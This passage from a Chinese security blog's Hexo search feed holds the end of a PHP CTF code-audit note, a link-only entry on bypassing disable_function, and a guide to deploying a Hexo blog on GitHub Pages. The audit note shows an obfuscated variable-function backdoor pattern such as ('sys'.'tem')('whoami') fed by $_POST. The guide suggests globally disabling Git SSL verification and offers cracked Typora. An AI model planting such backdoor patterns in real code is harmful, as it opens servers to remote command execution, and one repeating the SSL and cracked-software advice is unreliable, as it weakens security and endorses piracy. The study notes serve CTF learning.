class="hljs-title function_ invoke__">foo</span>();<br><span class="hljs-variable">$bar</span> = <span class="hljs-string">&#x27;bar&#x27;</span>;<br><span class="hljs-variable">$baz</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;foo&#x27;</span>, <span class="hljs-string">&#x27;bar&#x27;</span>, <span class="hljs-string">&#x27;baz&#x27;</span>, <span class="hljs-string">&#x27;quux&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$foo</span>-&gt;<span class="hljs-variable">$bar</span> . <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$foo</span>-&gt;&#123;<span class="hljs-variable">$baz</span>[<span class="hljs-number">1</span>]&#125; . <span class="hljs-string">&quot;\n&quot;</span>;   <span class="hljs-comment">// 等同于 $foo-&gt;bar。因此，输出结果也是 &#x27;I am bar.&#x27;</span><br><br><span class="hljs-variable">$start</span> = <span class="hljs-string">&#x27;b&#x27;</span>;<br><span class="hljs-variable">$end</span>   = <span class="hljs-string">&#x27;ar&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$foo</span>-&gt;&#123;<span class="hljs-variable">$start</span>.<span class="hljs-variable">$end</span>&#125; . <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$arr</span> = <span class="hljs-string">&#x27;arr&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$foo</span>-&gt;&#123;<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>]&#125; . <span class="hljs-string">&quot;\n&quot;</span>; <span class="hljs-comment">// 所以 $foo-&gt;&#123;$arr[1]&#125; 实际上是  $foo-&gt;r</span><br></code></pre></td></tr></table></figure></li><li><p><strong>可变变量</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;b&#x27;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;c&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$$a</span>;<br><span class="hljs-keyword">echo</span> $&#123;<span class="hljs-variable">$a</span>&#125;;  <br></code></pre></td></tr></table></figure></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;a&#x27;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;b&#x27;</span>;<br><span class="hljs-variable">$ab</span> = <span class="hljs-string">&#x27;cccc&#x27;</span>;<br><span class="hljs-keyword">echo</span> $&#123;<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>&#125;;<br></code></pre></td></tr></table></figure><ul><li><strong>动态函数</strong><ol><li><p><strong>动态执行函数</strong></p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;phPinfo&#x27;</span>; <span class="hljs-comment">#php 的函数忽略大小写，但是变量严格大小写，这样写没问题 而且直接调用 PHpinfo 也不会报错</span><br><span class="hljs-variable">$a</span>();<br></code></pre></td></tr></table></figure></li><li><p><strong>动态实例化类</strong></p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cc</span></span>&#123;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;cc&#x27;</span>;<br><span class="hljs-keyword">new</span> <span class="hljs-variable">$a</span>();<br></code></pre></td></tr></table></figure></li><li><p><strong>可变函数后门</strong></p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;1&#x27;</span>]<br><br><br><br>```<span class="hljs-title function_ invoke__">php</span><br>(<span class="hljs-string">&#x27;sys&#x27;</span>.<span class="hljs-string">&#x27;tem&#x27;</span>)(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br><span class="hljs-title function_ invoke__">join</span>(<span class="hljs-string">&quot;&quot;</span>,[<span class="hljs-string">&quot;sys&quot;</span>,<span class="hljs-string">&quot;tem&quot;</span>])(<span class="hljs-string">&quot;ipconfig&quot;</span>);<br><span class="hljs-title function_ invoke__">implode</span>([<span class="hljs-string">&#x27;sys&#x27;</span>,<span class="hljs-string">&#x27;tem&#x27;</span>])(<span class="hljs-string">&quot;ipconfig&quot;</span>);<br></code></pre></td></tr></table></figure></li></ol></li></ul><ol start="6"><li><strong>深入理解 <code>$_REQUEST</code> 数组</strong></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br></code></pre></td></tr></table></figure><ul><li>这行代码会输出 <code>$_REQUEST</code> 数组中键为 ‘a’ 的值。<code>$_REQUEST</code> 是一个包含了 <code>$_GET</code>、<code>$_POST</code> 和 <code>$_COOKIE</code> 数据的数组，默认情况下，它的顺序是先处理 <code>$_POST</code>，然后是 <code>$_GET</code>，最后是 <code>$_COOKIE</code>。</li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>php代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>绕过Disable_function</title>
    <link href="/2024/08/31/%E7%BB%95%E8%BF%87Disable-function/"/>
    <url>/2024/08/31/%E7%BB%95%E8%BF%87Disable-function/</url>
    
    <content type="html"><![CDATA[<h1 id="绕过Disable-function"><a href="#绕过Disable-function" class="headerlink" title="绕过Disable_function"></a>绕过Disable_function</h1><p><a href="https://xz.aliyun.com/t/10057">https://xz.aliyun.com/t/10057</a></p><p><a href="https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass">https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass</a></p><p><a href="https://christa.top/details/21/">https://christa.top/details/21/</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>rce</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>如何搭建一篇博客2024版</title>
    <link href="/2024/08/30/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A22024%E7%89%88/"/>
    <url>/2024/08/30/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A22024%E7%89%88/</url>
    
    <content type="html"><![CDATA[<h2 id="一：环境和工具准备："><a href="#一：环境和工具准备：" class="headerlink" title="一：环境和工具准备："></a>一：环境和工具准备：</h2><p>1.系统（Windows10 11）<br>2.Node js<br>3.Git<br>4.hexo<br>5.文本编辑器<br>6.一个Github账号</p><h2 id="二-Node-js的安装："><a href="#二-Node-js的安装：" class="headerlink" title="二.Node js的安装："></a>二.Node js的安装：</h2><p>1.打开Node官网，下载Node js安装程序，下载地址：<a href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a><br>2.下载后安装，安装目录尽量默认，除非你对它非常了解。<br>3.安装完成后，检查是否安装成功。打开cmd窗口，输入：node -v，看到了<br>版本信息，代表安装成功。<br>4.修改下载源。npm下载各种模块，默认是从国外的服务器下载，速度较慢，把它换成国内镜像，打开cmd窗口，运行命令：npm config set registry <a href="https://registry.npm.taobao.org/">https://registry.npm.taobao.org</a></p><p>国内访问 npm 官方源可能会有速度较慢或者不稳定的问题，可以切换到国内镜像源，如淘宝镜像：</p><p>npm config set registry <a href="https://registry.npmmirror.com/">https://registry.npmmirror.com/</a></p><h2 id="三-安装Git："><a href="#三-安装Git：" class="headerlink" title="三.安装Git："></a>三.安装Git：</h2><p>1.进入官网：<a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a> ，由于官网下载太慢可以通过淘宝的开源镜像下载 网址：<a href="https://registry.npmmirror.com/binary.html?path=git-for-windows/v2.36.1.windows.1/">https://registry.npmmirror.com/binary.html?path=git-for-windows/v2.36.1.windows.1/</a><br>2.下载后傻瓜式安装即可，安装目录可以默认，可以自选。<br>3.在桌面右键，出现Open Git Bash here即代表安装成功。</p><h2 id="四-安装Hexo："><a href="#四-安装Hexo：" class="headerlink" title="四.安装Hexo："></a>四.安装Hexo：</h2><p>1.右键Git Bash输入如下命令安装：npm install -g hexo-cli<br>2.安装完后输入hexo -v验证，出现版本号即代表成功。</p><h2 id="五-Github与仓库的创建"><a href="#五-Github与仓库的创建" class="headerlink" title="五.Github与仓库的创建"></a>五.Github与仓库的创建</h2><p>1.进入官网：<a href="https://github.com/">https://github.com/</a><br>2.点击右上角Sign up进行注册：<br>3.填写自己的邮箱、密码、用户名等信息，然后用邮箱验证即可完成。<br>4.注册完成后，点击右上角+按钮，选择New repository，创建一个名称为用户名.github.io<br>的仓库。</p><p>注意：1.名称必须为你的用户名.github.io,不然会404<br>  2.Description：为描述仓库。（选填）<br>  3.勾选 Initialize this repository with a README 初始化一个 README.md文件。<br>  4.点击 Creat repository 进行创建。</p><h2 id="六-环境配置："><a href="#六-环境配置：" class="headerlink" title="六.环境配置："></a>六.环境配置：</h2><p>1.配置用户名和邮箱：<br><code>git config --global user.name &quot;你的用户名&quot; git config --global user.email &quot;你的邮箱&quot;</code><br>2.通过 <code>git config -l</code>检查是否配置成功，现在git安装及配置全部完成。</p><h2 id="七-连接至Github："><a href="#七-连接至Github：" class="headerlink" title="七.连接至Github："></a>七.连接至Github：</h2><p>1.执行以下命令生成ssh公钥，它用于你的计算机连接Github。<br><code>ssh-keygen -t rsa -C &quot;你的邮箱&quot;</code></p><p>2.将 SSH KEY 配置到 GitHub<br>进入Github，点击右上角头像，选择settings，进入设置后选择 SSH and GPG keys，<br>名字尽量写英文的，把刚才复制的公钥填到 Key 那一栏。完成后保存。</p><p>3.测试连接，输入以下命令：<br><code>ssh -T git@github.com</code><br>出现连接到账户的提示信息，说明大功告成，现在完成了环境准备工作。</p><h2 id="八-初始化Hexo项目"><a href="#八-初始化Hexo项目" class="headerlink" title="八.初始化Hexo项目"></a>八.初始化Hexo项目</h2><p>1.在你想放博客文件的路径打开GBH，执行下列命令初始化项目。（把blog后面的东西删掉）<br><code>hexo init blog(项目名)</code><br>2.进入blog文件夹，再次右键GBH，输入 <code>npm i</code>安装相关依赖。</p><p>3.安装完成后，blog文件夹内有如下结构：<br>【node_modules】：依赖包<br>【scaffolds】：生成文章的一些模板<br>【source】：用来存放你的文章<br>【themes】：主题<br>【.npmignore】：发布时忽略的文件（可忽略）<br>【_config.landscape.yml】：主题的配置文件<br>【config.yml】：博客的配置文件<br>【package.json】：项目名称、描述、版本、运行和开发等信息</p><p>4.输入hexo s启动项目</p><h2 id="九-更换主题"><a href="#九-更换主题" class="headerlink" title="九.更换主题"></a>九.更换主题</h2><p>github：<a href="https://github.com/fluid-dev/hexo-theme-fluid/blob/master/_config.yml">https://github.com/fluid-dev/hexo-theme-fluid/blob/master/_config.yml</a></p><h2 id="十-页面个性化"><a href="#十-页面个性化" class="headerlink" title="十.页面个性化"></a>十.页面个性化</h2><ol><li>浏览器tab页名称<br>修改根目录下 _config.yml 中的 title 字段。<br>subtitle为副标题<br>description不用填写<br>keywords关键词，可不填写<br>author博客所有者<br>language语言，中国大陆使用zh-CN<br>timezone不用填写</li></ol><p>2.博客导航栏左侧文字<br>blog目录下_config.fluid.yml中的blog_title 字段。</p><p>3.首页正中间的文字<br>blog目录下_config.fluid.yml中的text字段。</p><h2 id="十一-将静态博客挂载到Github-Pages"><a href="#十一-将静态博客挂载到Github-Pages" class="headerlink" title="十一.将静态博客挂载到Github Pages"></a>十一.将静态博客挂载到Github Pages</h2><p>方案一（玄学）</p><p>1.安装 hexo-deployer-git，输入以下命令：<br><code>npm install hexo-deployer-git --save</code><br>2.修改根目录下的 _config.yml，配置 GitHub 相关信息</p><p>deploy:<br>type: git<br>repository: <a href="https://github.com/XXX/XXX.github.io.git">https://github.com/XXX/XXX.github.io.git</a><br>branch: main<br>token: XXXXXXXXXXXXX（要获取）</p><p>repository获取方式为：<br>进入<a href="https://github.com/">https://github.com/</a>,<br>点击右上角三条杠，点击你新建的用户名.github.io的仓库<br>点击中间那个绿色的Code按钮，选择左边的 Local 下面三个选项里选SSH,复制那个链接即可</p><p>其中 token 为 GitHub 的 Personal access tokens，获取方式如下图：<br>token只会出现一次，复制下来妥善保存，如果丢失，则要重新生成。</p><p>部署到Github：<br>先输入hexo clean清除缓存<br>再输入命令<code>hexo g -d</code></p><p>部署完成后等待两分钟，浏览器访问：https:&#x2F;&#x2F;你的GitHub用户名.github.io<br>能正常访问即部署成功。<br>但是很玄学，我上课前还可以，下课试试就不出来了，呜呜呜</p><h2 id="我的方案："><a href="#我的方案：" class="headerlink" title="我的方案："></a>我的方案：</h2><p>1.安装 hexo-deployer-git，输入以下命令：<br><code>npm install hexo-deployer-git --save</code></p><p>2.使用国内镜像源</p><ul><li><p>国内访问 npm 官方源可能会有速度较慢或者不稳定的问题，可以切换到国内镜像源，如淘宝镜像：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">npm config set registry https:<span class="hljs-comment">//registry.npmmirror.com/</span><br></code></pre></td></tr></table></figure></li></ul><p>之后再尝试重新安装依赖：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install hexo-deployer-git <span class="hljs-comment">--save</span><br></code></pre></td></tr></table></figure><p>3.配置 Hexo 部署到 GitHub Pages</p><p>打开你的 Hexo 项目根目录下的 <code>_config.yml</code> 文件，找到或添加 <code>deploy</code> 配置部分，按照以下示例进行配置：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">deploy:</span><br><span class="hljs-symbol">  type:</span> git<br><span class="hljs-symbol">  repository:</span> https:<span class="hljs-comment">//github.com/你的用户名/你的仓库名.github.io.git</span><br><span class="hljs-symbol">  branch:</span> main<br><span class="hljs-symbol">  token:</span> 你的GitHub个人访问令牌<br></code></pre></td></tr></table></figure><p><strong>注意</strong>：</p><ul><li><code>repository</code>：将此项替换为你 GitHub Pages 仓库的地址，格式通常为 <code>https://github.com/你的用户名/你的用户名.github.io.git</code>。</li><li><code>branch</code>：通常为 <code>main</code>，也可能是 <code>master</code>，视你的仓库配置而定。</li><li><code>token</code>：GitHub 的 Personal access token，用于身份验证。你可以在 GitHub 的 <a href="https://github.com/settings/tokens">Personal access tokens</a> 页面生成一个新令牌。</li></ul><p><strong>理缓存并生成部署</strong></p><ul><li><p>在终端中执行以下命令，清理缓存并生成静态文件，然后部署到 GitHub：</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs verilog">hexo clean<br>hexo <span class="hljs-keyword">generate</span><br>hexo deploy<br></code></pre></td></tr></table></figure></li></ul><p><strong>检查部署</strong></p><ul><li>部署完成后，等待几分钟后访问 <code>https://你的用户名.github.io</code>，查看你的博客是否成功部署。</li></ul><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>首先，在本地创建一篇新的文章。你可以使用 Hexo 提供的命令来生成一篇新文章的文件。</p><p><code>hexo new &quot;文章标题&quot;</code></p><p>这将会在 <code>source/_posts/</code> 目录下生成一个 <code>我的新文章.md</code> 文件。</p><h3 id="创建关于页面"><a href="#创建关于页面" class="headerlink" title="创建关于页面"></a>创建关于页面</h3><p>hexo new page about</p><h3 id="配置分类页面"><a href="#配置分类页面" class="headerlink" title="配置分类页面"></a>配置分类页面</h3><p>确保 <code>source/about/index.md</code> 文件中有内容。即使是一个简单的标题和段落也可以：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">title:</span> <span class="hljs-string">关于我</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2024-08-31 12:00:00</span><br><br><span class="hljs-string">这里是关于页面的内容。</span><br></code></pre></td></tr></table></figure><h3 id="创建分类页面"><a href="#创建分类页面" class="headerlink" title="创建分类页面"></a>创建分类页面</h3><p>hexo new page categories</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">title</span>: 关于我 <br><span class="hljs-attribute">date</span>: 2024-08-31 12:00:00 <br><span class="hljs-literal">-</span>-- 这里是关于页面的内容。<br></code></pre></td></tr></table></figure><h3 id="配置分类页面-1"><a href="#配置分类页面-1" class="headerlink" title="配置分类页面"></a>配置分类页面</h3><p>编辑 <code>source/categories/index.md</code> 文件，确保它正确配置为展示所有分类：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">title: 分类<br>layout: categories<br></code></pre></td></tr></table></figure><h3 id="生成标签页面"><a href="#生成标签页面" class="headerlink" title="生成标签页面"></a>生成标签页面</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo new page tags<br></code></pre></td></tr></table></figure><h3 id="配置标签页面"><a href="#配置标签页面" class="headerlink" title="配置标签页面"></a>配置标签页面</h3><p>接下来，编辑 <code>source/tags/index.md</code> 文件，以确保它正确显示标签列表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">title: 标签<br>layout: tags<br></code></pre></td></tr></table></figure><p>然后就可以写文件了</p><p>只需要注意前面是像：</p><p>title: 绕过Disable_function<br>date: 2024-08-31 12:47:42<br>categories: CTF-web rce<br>tags: web php       这样的</p><h3 id="三步建立法"><a href="#三步建立法" class="headerlink" title="三步建立法"></a>三步建立法</h3><p>hexo clean  </p><p>hexo generate</p><p>hexo server</p><p>然后在浏览器中访问 <code>http://localhost:4000/about/</code></p><p>什么没有好的md编辑器还要用vs和clion就out了，找我，破解的免费typora不用谢</p><p><strong>检查 Git 配置</strong><br>确保 Git 的配置正确。你可以运行以下命令查看 Git 的配置：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">git<span class="hljs-built_in"> config </span>--global --<span class="hljs-built_in">get</span> http.sslVerify<br></code></pre></td></tr></table></figure><p>如果 SSL 校验被禁用，可以尝试启用它：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">git config --global http.sslVerify <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p>有时 Git 对 SSL 证书的处理会有问题，可以尝试禁用 SSL 验证来确认问题是否出在 SSL 上。可以执行以下命令临时禁用 SSL 验证：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">git config --global http.sslVerify <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><p>然后再试一次部署。如果这能成功，说明问题出在 SSL 证书验证上。你可以在确认问题后，再考虑启用 SSL 或安装正确的证书。</p><p>要将你的Hexo网站与自定义域名 绑定，可以按照以下步骤操作：</p><h3 id="1-配置域名DNS"><a href="#1-配置域名DNS" class="headerlink" title="1. 配置域名DNS"></a>1. <strong>配置域名DNS</strong></h3><p>首先，你需要在你的域名注册商处配置DNS记录，以指向GitHub Pages的服务器。</p><h4 id="添加A记录（如果使用裸域名）"><a href="#添加A记录（如果使用裸域名）" class="headerlink" title="添加A记录（如果使用裸域名）"></a>添加A记录（如果使用裸域名）</h4><ol><li><p>登录到你的域名注册商的管理控制台。</p></li><li><p>找到你的域名 <code>uertnecesshazar.top</code> 的DNS设置页面。</p></li><li><p>添加一条A记录：</p><ul><li><strong>主机名（Host）</strong>：<code>@</code> 或留空</li><li><strong>记录类型（Type）</strong>：<code>A</code></li><li><strong>记录值（Value）</strong>：<code>185.199.108.153</code>, <code>185.199.109.153</code>, <code>185.199.110.153</code>, <code>185.199.111.153</code></li><li><strong>TTL</strong>：使用默认值</li></ul><p>你可以添加四条A记录，分别指向GitHub Pages的IP地址，以确保高可用性。</p></li></ol><h4 id="添加CNAME记录（如果使用带www的域名）"><a href="#添加CNAME记录（如果使用带www的域名）" class="headerlink" title="添加CNAME记录（如果使用带www的域名）"></a>添加CNAME记录（如果使用带www的域名）</h4><p>如果你还想支持 <code>www.uertnecesshazar.top</code> 这样的子域名，你可以添加一条CNAME记录：</p><ol><li><strong>主机名（Host）</strong>：<code>www</code></li><li><strong>记录类型（Type）</strong>：<code>CNAME</code></li><li><strong>记录值（Value）</strong>：<code>theganlove.github.io</code></li><li><strong>TTL</strong>：使用默认值</li></ol><h3 id="2-配置Hexo的CNAME文件"><a href="#2-配置Hexo的CNAME文件" class="headerlink" title="2. 配置Hexo的CNAME文件"></a>2. <strong>配置Hexo的CNAME文件</strong></h3><p>为了让GitHub Pages知道你的网站绑定了自定义域名，你需要在Hexo项目中添加一个 <code>CNAME</code> 文件。</p><ol><li><p><strong>创建CNAME文件</strong>：</p><ul><li>在你的 Hexo 项目的 <code>source</code> 目录中，创建一个名为 <code>CNAME</code> 的文件（无扩展名）。</li></ul></li><li><p><strong>编辑CNAME文件</strong>：</p><ul><li><p>在 <code>CNAME</code> 文件中添加你的自定义域名：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">uertnecesshazar.<span class="hljs-built_in">top</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p><strong>保存文件</strong>。</p></li></ol><h3 id="3-重新生成和部署网站"><a href="#3-重新生成和部署网站" class="headerlink" title="3. 重新生成和部署网站"></a>3. <strong>重新生成和部署网站</strong></h3><ol><li><p>生成静态文件：</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs verilog">hexo <span class="hljs-keyword">generate</span><br></code></pre></td></tr></table></figure></li><li><p>部署到GitHub Pages：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo deploy</span><br></code></pre></td></tr></table></figure></li></ol><h3 id="4-等待DNS生效"><a href="#4-等待DNS生效" class="headerlink" title="4. 等待DNS生效"></a>4. <strong>等待DNS生效</strong></h3><p>DNS更改可能需要几分钟到48小时生效。你可以使用 <code>nslookup</code> 或 <code>dig</code> 工具来检查DNS设置是否正确配置。</p><h3 id="5-访问你的自定义域名"><a href="#5-访问你的自定义域名" class="headerlink" title="5. 访问你的自定义域名"></a>5. <strong>访问你的自定义域名</strong></h3><p>一旦DNS生效，你应该可以通过 <code>http://uertnecesshazar.top</code> 或 <code>https://uertnecesshazar.top</code> 访问你的网站。</p><h3 id="6-配置HTTPS（可选）"><a href="#6-配置HTTPS（可选）" class="headerlink" title="6. 配置HTTPS（可选）"></a>6. <strong>配置HTTPS（可选）</strong></h3><p>GitHub Pages 支持免费的HTTPS证书。如果你使用自定义域名并希望启用HTTPS，请在GitHub仓库的设置中启用HTTPS。</p><ol><li>在你的GitHub仓库页面中，点击 “Settings”。</li><li>向下滚动到 “GitHub Pages” 部分。</li><li>如果选项可用，勾选 “Enforce HTTPS” 选项。</li></ol><p>这将强制所有用户通过HTTPS访问你的网站，确保数据传输的安全性。</p><p>通过以上步骤，你将成功将自定义域名 <code>uertnecesshazar.top</code> 与Hexo网站绑定</p>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
    </categories>
    
    
    <tags>
      
      <tag>环境</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
